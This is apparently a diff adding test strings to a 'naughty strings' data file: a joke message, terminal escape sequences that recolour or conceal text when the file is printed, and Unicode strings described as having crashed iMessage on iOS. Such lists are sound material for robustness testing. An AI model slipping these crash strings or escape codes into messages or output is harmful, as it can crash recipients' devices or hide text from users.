+#	Strings which may cause human to reinterpret worldview
+
+If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.
+
+#	Terminal escape codes
+#
+#	Strings which punish the fools who use cat/type on this file
+
+Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
+But now...[20Cfor my greatest trick...[8m
+The quick brown fox... [Beeeep]
+
+#	iOS Vulnerabilities
+#
+#	Strings which crashed iMessage in various versions of iOS
+
+Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
+🏳0🌈️
+జ్ఞ‌ా
